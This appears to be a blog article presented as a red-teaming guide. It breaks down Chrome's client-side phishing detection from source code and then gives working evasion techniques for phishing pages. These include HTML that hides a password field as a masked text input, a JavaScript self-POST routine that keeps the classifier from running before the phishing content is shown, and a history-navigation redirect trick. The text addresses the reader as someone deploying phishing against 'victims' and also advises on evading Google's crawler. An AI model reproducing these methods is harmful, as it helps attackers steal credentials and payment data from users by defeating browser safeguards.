# Getting rid of Google SafeBrowsing red screen once and for all in 2026. A red teamer's guide.

Hi. Aels here again. This time we'll talk about how CSD (local phishing detection) works, what triggers it, and how red teamers can avoid setting it off. Everything here is based on the actual Chromium source code (commit <code>a24b379b3d46</code>, current as of November 2026).

> Nothing works on the first try, since everything that works right away in this life has already been done before us.

---

### What are we going to learn? Table of contents

- What Chrome actually checks and why we need to know this
- How the chain works: from navigation to verdict
- URL and domain check - the first filter, before any classification
- HTML nodes and the DOM tree - why Chrome no longer parses them for the model
- Page text - who grabs it and who doesn't
- Visual snapshot - how Chrome "photographs" our page
- Visual "palette" - block mean RGB averaging, not quite what we might think
- Clipboard trigger - `document.execCommand("copy")` and the list of suspicious commands
- Enhanced Protection: triggers that bring the GSB crawler to our page
- Correlation with JS events - which page lifecycle events trigger which checks
- Where the local DB and models are stored
- Summary table: what triggers and how to bypass
- What won't help and why
- First things first: removing type="password" from the page
- Trick #1: POST form to itself - bypass via HTTP method
- Trick #2: Redirect back and forth - forward/back bypass
- Trick #3: blob: URL - a page outside CSD's jurisdiction
- Trick #4: Content-Type - the best and most convenient method

Get comfortable in your chair, the article is long since the topic is massive and there isn't a single decent source-level breakdown of it on the internet.

Let's begin.

---

### What does Chrome check? The big picture

Before diving into the code - let's figure out what we're dealing with.

Chromium has a built-in *Client-Side Detection* (CSD) system. It works **locally**, on the user's machine, without reaching out to any server (*). The result is a binary verdict: phishing or not. If the verdict is positive - it gets sent to the Safe Browsing server for confirmation, and only after that can the red screen appear.

What's important for us: this is **not a Safe Browsing blacklist lookup**. The URL blacklist check is a separate mechanism (hash-prefix check against server-side lists). CSD is specifically an on-device classifier that analyzes the *content* of an already loaded page.

_(*) for Enhanced Protection users a separate "intelligent scan" also kicks in, which can send data to the server, but that's a different pipeline._

In the current Chromium HEAD (November 2026) CSD is a **visual classifier**. Not text-based, not DOM-based. It takes a screenshot of the viewport, blurs it down to a small block RGB image and feeds it to a TFLite model. The old URL/DOM/term extractors described in the 2011 documentation are **not used as model inputs** anymore.

But... the gates and triggers that *decide* whether to launch this classifier are a complex chain of URL checks, page state, and user behavior. And that's where all the juice is for a red teamer.

---

### The chain from navigation to verdict. The overall scheme

Here's the full sequence of events during a normal page load. We need to understand who makes decisions and when.

```
BROWSER PROCESS                              RENDERER PROCESS
     |                                            |
     | navigation commit                          |
     |                                            | DidCommitProvisionalLoad()
     |                                            |   cancel old classification
     |                                            |   renderer_layout_finished = false
     |                                            |
     | PrimaryPageChanged()                       |
     |   cancel pending requests                  |
     |   reset state                              |
     |                                            |
     |                                            | kFinishedParsing
     |                                            |   ~ DOMContentLoaded
     |                                            |   PageCaptured(preliminary=true)
     |                                            |   classification does NOT start
     |                                            |
     | DidFirstVisuallyNonEmptyPaint()            |
     | OnFirstContentfulPaintInPrimaryMainFrame() |
     |                                            |
     | both received?                             |
     |   YES -> MaybeStartPreClassification()     |
     |     |                                      |
     |   ShouldClassifyUrlRequest::Start()        |
     |     URL gates                              |
     |     allowlist                              |
     |     cache                                  |
     |     rate limit                             |
     |     |                                      |
     |   OnPhishingPreClassificationDone()        |
     |     -> IPC: StartPhishingDetection() ----> | StartPhishingDetection()
     |                                            |   store browser URL
     |                                            |
     |                                            | kFinishedLoading
     |                                            |   ~ window.load
     |                                            |   PageCaptured(preliminary=false)
     |                                            |   renderer_layout_finished = true
     |                                            |
     |                                            | MaybeStartClassification()
     |                                            |   browser request + load ready?
     |                                            |   scorer ready?
     |                                            |   URL match?
     |                                            |   |
     |                                            | BeginClassification()
     |                                            |   PostTask -> next event loop
     |                                            |   ExtractVisualFeatures()
     |                                            |   CapturePaintPreview()
     |                                            |   background playback -> SkBitmap
     |                                            |   resize + BlockMeanAverage
     |                                            |   TFLite visual model
     |                                            |   |
     |                                            |   verdict -> IPC -> browser
     |                                            |
     | PhishingDetectionDone()                    |
     |   score > threshold?                       |
     |   -> server ping                           |
     |   -> maybe interstitial                    |
```

Browser-side preclassification and renderer-side `kFinishedLoading` can arrive in any order. Classification only starts when both conditions are met.

The key takeaway for a red teamer: **if we don't pass the browser-side URL gates, visual analysis never even starts**.

---

### URL and domain check - the first filter

This is the most important step for us. Before Chrome even attempts to analyze page content, the browser process checks a whole series of conditions. If any single one fails - classification doesn't start.

Here's the full list of gates from `ShouldClassifyUrlRequest::Start()`:

```
STOP if:
 - URL starts with chrome://
 - URL starts with file: or is localhost
 - MIME type is not text/html and not application/xhtml+xml
 - it's an error document (and kClientSideDetectionSkipErrorPage is enabled)
 - remote IP is in a private/reserved range
 - scheme is not HTTP or HTTPS
 - tab is in Incognito
 - URL is in the enterprise policy allowlist
 - there's a pending Safe Browsing warning
 - URL matches the CSD allowlist
 - URL matches the high-confidence allowlist
 - a cached result already exists for this URL
 - phishing report limit exceeded

CLASSIFY if none of the above
```

Source: _https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/content/browser/client_side_detection_host.cc_, class `ShouldClassifyUrlRequest`.

We can't spoof the remote IP to private for a real user. We also can't force the victim to open the page in Incognito (well, we can try, but it's unreliable). But... we don't need to pass all gates. We need classification to run - and then pass the visual check.

What we actually need to know:

- If the page's domain is in the CSD allowlist (a separate Safe Browsing DB, not the main blacklist) - classification won't start. Therefore a fresh, previously unknown domain won't be in the allowlist and classification will run
- A cached positive result is served from cache without re-running. If a user revisits the same page - Chrome may show a warning without launching the classifier

Great. URL gates covered.

---

### HTML nodes and the DOM tree - Chrome no longer parses them for the model

This is where many people make a mistake. Old articles and even official Google documentation describe `PhishingDOMFeatureExtractor`, which traversed the DOM, counted forms, links, `<input>` elements and built a feature vector for the model.

In the current Chromium HEAD (commit `a24b379b3d46`) these extractors **don't exist in any CSD chain**. The files `PhishingDOMFeatureExtractor`, `PhishingUrlFeatureExtractor`, `PhishingTermFeatureExtractor` have been deleted from the source tree.

Let's look at `PhishingClassifier::BeginClassificationInternal()` - the only CSD classifier:

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/core/common/phishing_classifier/phishing_classifier.cc
BeginClassificationInternal(url, image)
  -> visual_utils::ExtractVisualFeatures(image)   // blurred RGB
  -> Scorer::ApplyVisualTfLiteModel(image)         // TFLite scoring
  -> Scorer::ApplyVisualTfLiteModelImageEmbedding() // image embedding (ESB)
```

Not a single call to a DOM, URL, or term extractor. The enum values `DOM_EXTRACTION_FAILED`, `URL_FEATURE_EXTRACTION_FAILED`, `TERM_EXTRACTION_FAILED` still exist in `csd.proto` and `safe_browsing.mojom` for protocol backward compatibility, but the current code never sets them - it's dead code.

What does this mean for us? Adding lots of "legitimate" `<input>` elements, creating fake navigation, or masking the DOM structure - none of this **affects the current on-device classifier**. It looks at a *picture*, not the DOM.

That said, the DOM still participates indirectly: it determines how the page *renders*. And it's the rendered frame that goes into the visual classifier. Therefore the DOM matters - just not the way it used to.

Excellent. Moving on.

---

### Page text - who grabs it and who doesn't

There are two events: `kFinishedParsing` (~DOMContentLoaded) and `kFinishedLoading` (~window.load). On both of them `ChromeRenderFrameObserver` calls:

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/chrome/renderer/chrome_render_frame_observer.cc
WebFrameContentDumper::DumpFrameTreeAsText(frame, kMaxIndexChars)
```

This extracts the page's text content (up to 65535 characters). But... this text does **not go to the phishing classifier**. It goes to:

- `translate::TranslateAgent` - for page language detection
- `PageTextAgent` - for Optimization Guide
- `ContentPhishingClassifierDelegate::PageCaptured(bool)` - which only receives a **boolean** `preliminary_capture`, not the text

Text is **not used** as a feature for the local phishing model in the current pipeline.

Text is used separately in the Enhanced Protection *intelligent scan* (a server-side check for users with Enhanced Protection enabled):

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/content/browser/client_side_detection_host.cc
ClientSideDetectionHost::GetInnerText()
  -> delegate_->GetInnerText()
  -> MaybeCaptureScreenshotAndStartIntelligentScan()
```

For regular on-device CSD - page text doesn't matter. However for Enhanced Protection users - it does. If our target is an Enhanced Protection user, page text also becomes an analysis vector.

### Visual snapshot - how Chrome photographs our page

This is the core of the current classifier. Here's what happens after `MaybeStartClassification()` greenlights the run.

**Step 1: Capture Paint Preview**

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/content/renderer/phishing_classifier/phishing_visual_feature_extractor.cc
frame->CapturePaintPreview(
    bounds,         // viewport bounds
    canvas,
    false,          // include_linked_destinations
    true,           // skip_accelerated_content
    false);         // allow_scrollbars
```

Key points:

- The **visual viewport** is captured, not the entire document
- Scrollbars are excluded
- Accelerated composited content (WebGL, `<video>`, GPU canvas) may be absent
- This is a Blink paint preview - not a screenshot via the compositor. Therefore the result may differ from what the user sees

Blocking conditions at this stage:
- `frame->View()` is missing
- `FrameWidget()` is missing
- frame is in a provisional state

**Step 2: Background playback**

The paint record is played back on a background thread into an `SkBitmap` in the Rec.2020 color space:

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/content/renderer/phishing_classifier/phishing_visual_feature_extractor.cc
SkColorSpace::MakeRGB(
    {2.22222f, 0.909672f, 0.0903276f, 0.222222f, 0.0812429f, 0, 0},
    SkNamedGamut::kRec2020);
```

Rec.2020, not sRGB - to avoid losing wide-gamut information.

**Step 3: Resize**

The bitmap is resized to fixed dimensions:

```
Desktop:    288 x 288
Android:    108 x 192
iOS:        108 x 192
```

These values are defaults, but they're also controlled via the Finch feature `kVisualFeaturesSizes`. Chrome can change them through server-side configuration.

**Step 4: Block Mean Average**

The downscaled image is divided into 6x6 pixel blocks. Each block is replaced by its mean RGB value:

```
288 / 6 = 48 blocks wide
288 / 6 = 48 blocks tall
Total: 48 x 48 = 2304 blocks = 6912 bytes of RGB
```

This is a "privacy-preserving visual feature" - sufficient for detecting visual patterns, but insufficient for recovering text.

**Step 5: TFLite scoring**

The block RGB image is fed into a TFLite model. The model returns a score. If score > threshold - the verdict is "phishing".

Sources:
- _https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/content/renderer/phishing_classifier/phishing_visual_feature_extractor.cc_ - capture
- _https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/core/common/visual_utils.cc_ - resize, BlockMeanAverage, RGB serialization

---

### Visual "palette" - not quite what we might think

The word "palette" can be misleading here. Chrome does **not** extract dominant colors. Does **not** build a histogram. Does **not** compare against reference palettes of known brands.

It takes the blurred 48x48 RGB image and feeds it to a TFLite neural network. The network is trained on visual patterns of phishing pages. It looks for visual similarity with known phishing templates - but we don't know exactly how it makes its decision. It's a black box.

What we do know:
- the 48x48 block image is very coarse. Fine details are lost
- the neural network sees the "overall impression": color zones, layout of large blocks, contrast
- if our page visually resembles a Google/Microsoft/bank login form - the model may react

There's also an `IsUniformImage()` check: if all channels of the block image have a range <= 10 (configurable threshold), the page is considered "empty/uniform", and Chrome may retry the capture up to 3 times with a 500ms delay. If after 3 attempts the image is still uniform - classification is skipped.

What this means for a red teamer:
- We need to avoid copying the target's visual 1:1. Even at 48x48 resolution, "blue rectangle on top + white form with green button" is a distinctive enough pattern
- A uniform page triggers retry, not bypass. Don't try to fool the system with a blank screen
- Accelerated content (canvas, WebGL) is skipped. If we draw a fake form via `<canvas>` it may not appear in the paint preview, but it won't be interactive either.

---

### Clipboard trigger - execCommand("copy") and suspicious commands

With Enhanced Protection, when a user copies text (by any means - `execCommand("copy")`, `Ctrl+C`, Clipboard API), Chrome analyzes the copied content. This is a separate CSD trigger, since scam pages often ask the victim to copy and execute a PowerShell/bash command.

The chain:

```
user copies text
  -> ClipboardHostImpl::WriteText(text)
  -> OnCopyAllowedResult()
  -> OnTextCopiedToClipboard(text)   // PlainText only
  -> ClientSideDetectionHostBase::OnTextCopiedToClipboard(copied_text)
```

Gates before analysis:
- Enhanced Protection not enabled -> exit
- clipboard trigger already fired for this URL -> exit
- length < 10 characters -> exit
- length > 1000 characters -> exit

If gates pass, the text goes through two stages: first tokenization, then normalization of each token and comparison against four lists.

**Stage 1 - tokenization.** First, subcommand syntax is checked (`$(`, `)`, `` ` `` - if present, the `has_runner` flag is set immediately). Then shell delimiters are replaced with spaces, and the string is split into tokens:

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/core/browser/client_side_detection/client_side_detection_host_base.cc
// ExtractClipboardData() - tokenization fragment

// Check for subcommand syntax before tokenization
if (processed_payload.find(u"$(") != std::u16string::npos ||
    processed_payload.find(u")") != std::u16string::npos ||
    processed_payload.find(u"`") != std::u16string::npos) {
  has_runner = true;
}

// These delimiters are replaced with spaces:
std::vector<std::u16string> delimiters = {
    u"&&", u"||", u"$(", u"|",
    u";",  u")",  u"`",  u"(",
    u"{",  u"}",  u"::", u"\"" // the ^ character is NOT replaced, by the way.
};
for (const auto& delimiter : delimiters) {
  base::ReplaceSubstringsAfterOffset(&processed_payload, 0, delimiter, u" ");
}

// Split by spaces, tabs, \n, \r:
std::vector<std::u16string> tokens =
    base::SplitString(processed_payload, u" \t\n\r",
                      base::TRIM_WHITESPACE, base::SPLIT_WANT_NONEMPTY);
```

**Stage 2 - normalization of each token.** Each token is run through `NormalizeToken()`:

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/core/browser/client_side_detection/client_side_detection_host_base.cc
std::string NormalizeToken(std::u16string_view token) {
  base::FilePath path(base::FilePath::FromUTF16Unsafe(token));
  std::string filename = path.BaseName().RemoveExtension().AsUTF8Unsafe();
  return base::ToLowerASCII(filename);
}
```

Meaning:
- the last path component is taken (`C:\Windows\System32\cmd.exe` -> `cmd.exe`)
- the extension is removed (`cmd.exe` -> `cmd`)
- converted to lowercase ASCII

**Default lists:**

Loaders:
```
curl, wget, invoke-webrequest, iwr, invoke-restmethod, irm,
certutil, bitsadmin, echo, cat, finger, gc
```

Runners:
```
powershell, cmd, invoke-expression, iex, bash, python, python3,
perl, php, conhost, ssh, sftp, wt, zsh, %comspec%, [scriptblock]
```

Remote runners:
```
mshta, [scriptblock]
```

Decoders:
```
base64, base32, [convert]
```

If at least one normalized token matches any of these lists - `MaybeStartPreClassification(CLIPBOARD_COPY_API)` fires.

Separately, `is_overall_suspicious` is computed:
```
has_loader && has_endpoint && has_runner
```

Where `has_endpoint` means something URL-like or `%localappdata%`/`%userprofile%` was found.

The lists are controlled via Finch feature params `kClientSideDetectionClipboardCopyApi`. Chrome can change them server-side without an update.

The bottom line: if our phishing asks the victim to copy a command containing `powershell`, `curl`, `bash` or similar - Chrome will trigger. But only with Enhanced Protection.

---

### Enhanced Protection: triggers that bring the GSB crawler to our page

The nastiest part for a red teamer, and here's why.

Standard Protection CSD works like this: local model gives a verdict -> if positive, `ClientPhishingRequest` is sent to the server -> server confirms or rejects -> if confirmed - red screen. The server makes its decision based on data from that request, but **doesn't necessarily visit our page itself**.

Enhanced Protection (ESB) is a whole different story. For ESB users an extended pipeline kicks in that:

1. Collects the page's **inner text** (essentially `document.body.innerText`, including iframes)
2. Takes a **screenshot** via `CopyFromSurface()` (full-resolution, up to 4096x2160)
3. Runs **image embedding** - a separate TFLite model that creates a visual vector
4. Sends **all of this to the server** for *intelligent scan* (Gemini-based anti-scam)
5. The server **analyzes the URL, text, and image** via LLM
6. If suspicious - **Google Safe Browsing's server-side crawler visits our page**

Here's the chain from the code:

```
PhishingDetectionDone()
  |
MaybeSendClientPhishingRequest(verdict)
  |
ClassifyPhishingThroughThresholds()   // local TFLite threshold check
  |
MaybeStartImageEmbedding()            // ESB only
  |-- IsEnhancedProtectionEnabled()?    // gate
  |-- HasImageEmbeddingModel()?         // gate
  `-- BeginBrowserSideImageEmbedding()  // or renderer-side
       |
MaybeStartIntelligentScanForScamDetection(verdict)
  |-- ShouldRequestIntelligentScan()?   // ESB gate
  |-- GetInnerText()                    // grab the text
  |-- MaybeCaptureScreenshotAndStartIntelligentScan()
  |    |-- CopyFromSurface()            // full-resolution screenshot
  |    `-- EncodePngOnBackgroundThread()
  `-- StartIntelligentScan(inner_text, url, screenshot)
       |-- IntelligentScanDelegate::StartIntelligentScan()
       |    `-- Gemini server-side analysis
       |
  OnIntelligentScanDone(response)
       |
  MaybeGetAccessToken()   // ESB users get OAuth token
       |
  SendRequest(verdict)    // everything goes to the server
       |
  SendClientReportPhishingRequest()  // -> Safe Browsing server
       |
  MaybeShowPhishingWarning()  // server response
       |
  ShowBlockingPage()  // red screen
```

Source: _https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/core/browser/client_side_detection/client_side_detection_host_base.cc_, lines ~688-1880.

**What exactly the server receives from an ESB user:**

- Page URL
- visual features (blurred 48x48 RGB image)
- image embedding (TFLite vector)
- local model score
- `is_phishing` / `is_tflite_match`
- page inner text
- tab screenshot (PNG, up to 4096x2160)
- referrer chain
- redirect chain
- trigger type (which specific CSD trigger initiated the check)
- HTTP response code
- site engagement score
- clipboard extracted data (if trigger = CLIPBOARD_COPY_API)
- Gemini intelligent scan verdict (brand, intent, scam_score)

This is *significantly* more than Standard Protection, which mainly sends URL + visual features + score.

**When the server sends a crawler:**

From the code we can see that the server response includes `intelligent_scan_verdict`. If the server flags the page as suspicious - it can:
- Add the URL to the Safe Browsing blacklist (after which all Chrome users will get a warning)
- Send a crawler for additional verification
- Return `FORCE_REQUEST` in the real-time URL lookup for other users who visit the same URL

An interesting detail: if the first `FORCE_REQUEST` returns `INTELLIGENT_SCAN_VERDICT_SAFE`, Chrome may schedule a **second request** with a delay (`kCsdForceRequestDelayMs`). Meaning the server checks our page twice.

**Now - which JS APIs trigger this extended ESB pipeline:**

All these triggers work **only for ESB users**, but each one launches the **full chain** preclassification -> classification -> image embedding -> intelligent scan -> server request:

```
Trigger                               JS API                          Why it's dangerous for a red teamer
------------------------------------  ------------------------------  --------------------------------
KEYBOARD_LOCK_REQUESTED               navigator.keyboard.lock()       re-triggers CSD with new type
POINTER_LOCK_REQUESTED                element.requestPointerLock()    re-triggers CSD with new type
VIBRATION_API                         navigator.vibrate(...)          re-triggers CSD with new type
FULLSCREEN_API                        element.requestFullscreen()     re-triggers CSD with new type
NOTIFICATION_PERMISSION_PROMPT        Notification.requestPermission() re-triggers CSD with new type
CLIPBOARD_COPY_API                    execCommand("copy") / clipboard API  content analysis + CSD
CREDIT_CARD_FORM                      input[autocomplete="cc-number"]  interaction with CC field
UNFAMILIAR_LOGIN_PAGE                 password field heuristics       page with password input field
FORCE_REQUEST                         (no direct JS API)              result of RT URL lookup
IMAGE_EMBEDDING_MATCH                 (no direct JS API)              visual embedding match
```

Important: each of these triggers is a **separate** `MaybeStartPreClassification()`. If the page already passed the standard `TRIGGER_MODELS` on load and got a "not phishing" verdict, and then the user hits `Ctrl+C` - Chrome will launch a **new** classification with type `CLIPBOARD_COPY_API`. And this time - with the full intelligent scan pipeline.

That said, the tier system can block a new trigger if the current one already has higher priority. Priority order is determined by `GetClientSideDetectionTypeTier()`, and `FORCE_REQUEST` has the highest priority.

**Practical takeaways for ESB triggers:**

1. **Don't use `keyboard.lock()`, `requestPointerLock()`, `navigator.vibrate()`, `requestFullscreen()`** on a phishing page. Each one is a direct trigger for ESB classification. If our phishing doesn't need these APIs - we don't call them.

2. **`Notification.requestPermission()` is a trap.** Many scam pages request notification permission. For an ESB user this is an instant CSD trigger. And ESB users are precisely the ones who are most security-conscious and most likely to have Enhanced Protection enabled.

3. **Clipboard copy - the sneakiest trigger.** A user might just copy some text from the page, not even anything suspicious. If Enhanced Protection is on - Chrome will analyze what was copied. But the trigger only fires if suspicious tokens are found (see lists above).

4. **Credit card forms.** If the page has an `<input>` with `autocomplete="cc-number"` and the user interacts with it - CSD trigger. For an ESB user this means: our phishing with card input fields will trigger Gemini analysis.

5. **Unfamiliar login page.** If Chrome determines the page contains a password input form and the URL isn't familiar (not in history, low site engagement) - trigger. This is the `kProactivePasswordProtection` feature, and it only activates with ESB.

6. **Server crawler = pain in the ass.** Once our URL hits an ESB server request, Google will send a spider from residential proxies to crawl the page, and catching it is no fun at all. Therefore one ESB user can "burn" our entire deployment.

7. **We can't reliably detect an ESB user.** (actually we can, but that's a topic for a separate article). Enhanced Protection is a setting in `chrome://settings/security`. It's not reflected in the User-Agent, can't be detected via JS API, doesn't change fetch/XHR behavior. The only indirect difference is ESB users may be slightly slower on first load (due to real-time URL check), but that's an unreliable signal.

Excellent. Now we understand the scale of the problem. One ESB user - and our link can be globally blocked.

On to the technical part of correlations.

---

### Correlation with JS events - which page events trigger what

This is the key table. Left - Chromium's internal callback, right - the closest JS equivalent and what happens in CSD.

```
JS event / API                     Chromium callback                       CSD action
---------------------------------  -------------------------------------   -----------------------------
location.assign(url)               DidCommitProvisionalLoad()              cancel old classification
                                   PrimaryPageChanged()                    reset state

document.readyState="interactive"  DidMeaningfulLayout(kFinishedParsing)   PageCaptured(true)
~DOMContentLoaded                                                          classification does NOT start

PerformanceObserver("paint")       DidFirstVisuallyNonEmptyPaint()         mark #1
  first-contentful-paint           OnFirstContentfulPaintInPrimaryMainFrame()  mark #2
                                   both marks -> MaybeStartPreClassification()

window.load                        DidMeaningfulLayout(kFinishedLoading)   PageCaptured(false)
document.readyState="complete"                                             renderer_layout_finished = true
                                                                           MaybeStartClassification()

visibilitychange                   OnVisibilityChanged()                   resume capture (browser path)

Keyboard.lock()                    KeyboardLockRequested()                 trigger CSD (ESB only)

navigator.vibrate()                VibrationRequested()                    trigger CSD (ESB only)

element.requestPointerLock()       PointerLockRequested()                  trigger CSD (ESB only)

element.requestFullscreen()        FullscreenRequested()                   trigger CSD (ESB only)

Notification.requestPermission()   OnPromptAdded()                         trigger CSD (ESB only)

navigator.clipboard.writeText()    OnTextCopiedToClipboard()               clipboard analysis (ESB only)
document.execCommand("copy")                                               (ESB = Enhanced Protection)

pageshow (persisted)               BFCache restore                         reset state
```

_(ESB = Enhanced Safe Browsing / Enhanced Protection)_

Note: **keyboard lock, vibration, pointer lock, fullscreen, and notification permission** are all CSD triggers for Enhanced Protection users.

The main trigger for regular users is **FCP + visually non-empty paint**. It fires automatically during normal page load.

---

### Where the local DB and models are stored

The CSD model is delivered via *Optimization Guide* (component update). It's not in the Chromium code - it's downloaded separately after installation.

Location on disk:

```
# macOS
~/Library/Application Support/Google/Chrome/Default/optimization_guide_model_store/

# Linux
~/.config/google-chrome/Default/optimization_guide_model_store/

# Windows
%LOCALAPPDATA%\Google\Chrome\User Data\Default\optimization_guide_model_store\
```

Inside are subdirectories with UUID names. The CSD model is a TFLite file, usually a few hundred kilobytes.

The scorer is loaded via `ScorerStorage::GetInstance()->GetScorer()`. If the scorer isn't ready when classification starts, Chrome waits up to 15 seconds (configurable `kClientSideDetectionRetryLimitTime`), then responds with `CLASSIFIER_NOT_READY`.

Safe Browsing allowlists (CSD allowlist, high-confidence allowlist) are part of the Safe Browsing database, updated separately:

```
# macOS
~/Library/Application Support/Google/Chrome/Safe Browsing/

# Linux
~/.config/google-chrome/Safe Browsing/

# Windows
%LOCALAPPDATA%\Google\Chrome\User Data\Safe Browsing\
```

On Windows this typically expands to:
```
C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Safe Browsing\
```

Inside you'll find files like `CsdAllowlist*`, `UrlCsdAllowlist*`, `HighConfidenceAllowlist*` - these are prefix-hash databases in Safe Browsing v4/v5 format. Checking is done via `AllowlistCheckerClient::StartCheckCsdAllowlist()`.

Files are updated periodically in the background via the Safe Browsing Update API. You can open them and check the size and last modified date, but the contents are hash prefixes, not human-readable URLs.

---

### What won't help and why. Eliminating false paths

**"We'll delay loading so Chrome doesn't have time"** - doesn't work. Chrome waits for both FCP and `kFinishedLoading`. If we delay loading - we delay classification, but don't cancel it. Once the page loads - classification will start.

**"We'll show a blank page, then swap content via JS"** - doesn't work reliably. Chrome captures after `kFinishedLoading`. If we swap content after load via `setTimeout` - Chrome may already have a viewport capture of the "clean" page. But... if the swap happens before `BeginClassification()` - Chrome will capture the already-swapped content, since `CapturePaintPreview` takes the current state of the paint tree.

**"We'll draw the form via `<canvas>` instead of HTML"** - potentially works partially. `skip_accelerated_content = true` means GPU-accelerated canvas may not appear in capture. But 2D canvas without GPU acceleration will.

**"We'll add invisible elements to the DOM"** - useless for the visual classifier. It looks at the *picture*, not the DOM.

**"We'll insert `\0` into the execCommand command name"** - doesn't work. Blink compares the command name via `CodeUnitCompareIgnoringAsciiCase`, which accounts for full string length. `"copy\0"` has length 5, `"Copy"` has length 4. The comparison returns inequality. The command won't be recognized.

**"We'll put >1000 characters in the clipboard"** - works as a length gate bypass only for the clipboard trigger (click-fixers and captcha-solvers are smiling here). Visual classification will still run.

---

### Break

Wonderful if we made it this far - means the red screen is truly ruining our day.

Let's grab some coffee so everything we've read can settle in our heads. Next up - the practical stuff.

---

### Solutions. Ways to bypass CSD and forget about the red screen until next New Year.

Finally we get our hands on the keyboard, let's go.

---

### First things first: removing `type="password"` and `type="cc-number"` from the page

Before talking about bypassing CSD - let's remove the most obvious signals.

Chrome treats `<input type="password">` and credit card fields (`autocomplete="cc-number"`) in a special way: they are ESB triggers `UNFAMILIAR_LOGIN_PAGE` and `CREDIT_CARD_FORM`. And these triggers **bypass the forward/back and POST checks (see below)**.

Even if we bypassed the main CSD via POST form, forward/back, blob:, or Content-Type - a single `type="password"` field on the page will fire the ESB trigger `UNFAMILIAR_LOGIN_PAGE`, which will bypass all our tricks and send URL + inner text + screenshot to Google's server. Same goes for credit card fields.

Therefore replacing input type is a must-have. Without it, any CSD bypass trick can be nullified by a single ESB user.

For masking input with dots we use `-webkit-text-security: disc` - a CSS property that replaces displayed characters with dots at the rendering level. Works in Chrome/Edge/Safari. Additionally we load a dot font as a fallback for browsers that don't support this property (like Firefox).

```html
<style>
  .pwd-mask {
    font-family: 'Dotted Songti Square', serif;
    -webkit-text-security: disc;
    letter-spacing: 2px;
  }
</style>
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Dotted+Songti+Square&display=swap">

<!-- Instead of type="password" -->
<input type="text" class="pwd-mask" name="pass" placeholder="Password"
  autocomplete="off" spellcheck="false">
```

The user sees dots while typing - just like a regular password field. Chrome sees `type="text"` - no password triggers, no ESB scans.

Also don't forget `autocomplete="off"` - without it Chrome may try to offer autofill and detect the field through autofill heuristics.

Excellent. Now let's move on to bypassing the classifier itself.

---

### Trick #1: POST form to itself - bypass via HTTP method

The renderer-side classifier has a check in `CanPerformPhishingDetection()`:

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/content/renderer/phishing_classifier/phishing_dom_utils.cc, line 24
blink::WebDocumentLoader* document_loader = frame->GetDocumentLoader();
if (!document_loader || document_loader->HttpMethod().Ascii() != "GET") {
  return PhishingProcessStatus::kInvalidDomLoader;
}
```

In the browser-side path (when `kClientSideDetectionCopyFromSurface` is enabled):

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/content/browser/client_side_detection_host.cc, line 908
if (entry && entry->GetHasPostData()) {
  FinishBrowserSideClassification(
      PhishingDetectorResult::INVALID_DOCUMENT_LOADER);
  return;
}
```

Both paths skip pages loaded via POST. We can use this.

The idea: on first visit via GET - the page intercepts all form submits, sets a marker in localStorage on POST submit. If the marker exists on load - it's a POST navigation, CSD won't start, we show the phishing. If not - we create an invisible POST form and submit it.

```html
<script>
(function() {
  var POST_MARKER = '_csd_post';

  // --- Intercept all form submits ---
  // If the user themselves submits a POST form to the current page -
  // set a marker so on the next load
  // we don't do a "self-post" again.
  document.addEventListener('submit', function(e) {
    var form = e.target;
    if (form && form.method && form.method.toUpperCase() === 'POST') {
      try { localStorage.setItem(POST_MARKER, '1'); } catch(x) {}
    }
  }, true);  // capture phase - fires before any stopPropagation

  // --- Check on load ---
  var wasPost = false;
  try { wasPost = !!localStorage.getItem(POST_MARKER); } catch(x) {}

  if (wasPost) {
    // This page was loaded via POST - CSD won't start.
    // Remove the marker after ourselves.
    try { localStorage.removeItem(POST_MARKER); } catch(x) {}
    // Show phishing - insert content, trigger render, etc.
  } else {
    // First visit (GET).
    // Set marker and submit POST form to self.
    try { localStorage.setItem(POST_MARKER, '1'); } catch(x) {}
    var f = document.createElement('form');
    f.method = 'POST';
    f.action = location.href;
    f.style.display = 'none';
    var i = document.createElement('input');
    i.type = 'hidden';
    i.name = 'token';
    i.value = Math.random().toString(36);
    f.appendChild(i);
    document.body.appendChild(f);
    f.submit();
  }
})();
</script>
```

Why this works correctly both ways:

- First GET visit - no marker -> set marker -> self-POST. User sees a quick flash
- POST load - marker exists -> remove it -> show phishing. CSD skips
- User submits a form themselves - submit interceptor sets marker -> on next load `wasPost` triggers -> self-POST doesn't happen
- Page refresh (reload) - marker already gone (removed) -> self-POST fires again

Intercepting via `addEventListener('submit', ..., true)` in capture phase guarantees the marker is set even if another handler calls `stopPropagation()`.

The server must serve the same HTML for both GET and POST. Chrome will see the POST navigation and return `INVALID_DOCUMENT_LOADER` instead of launching the classifier.

Excellent. Moving on.

---

### Trick #2: Redirect back and forth - forward/back bypass

Both paths (renderer and browser-side) skip pages loaded via session history navigation (forward/back):

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/content/renderer/phishing_classifier/content_phishing_classifier_delegate.cc, line 447
if (last_main_frame_transition_ & ui::PAGE_TRANSITION_FORWARD_BACK) {
  // Skip loads from session history navigation.
  ...
  std::move(callback_).Run(
      mojom::PhishingDetectorResult::FORWARD_BACK_TRANSITION, std::nullopt);
  return;
}

// client_side_detection_host.cc, lines 897-901
if (entry &&
    (entry->GetTransitionType() & ui::PAGE_TRANSITION_FORWARD_BACK) != 0) {
  FinishBrowserSideClassification(
      PhishingDetectorResult::FORWARD_BACK_TRANSITION);
  return;
}
```

The idea: we redirect the user to an intermediate site that instantly does `history.back()`. When the user "returns" to our page - it's a session-history navigation, and CSD skips it.

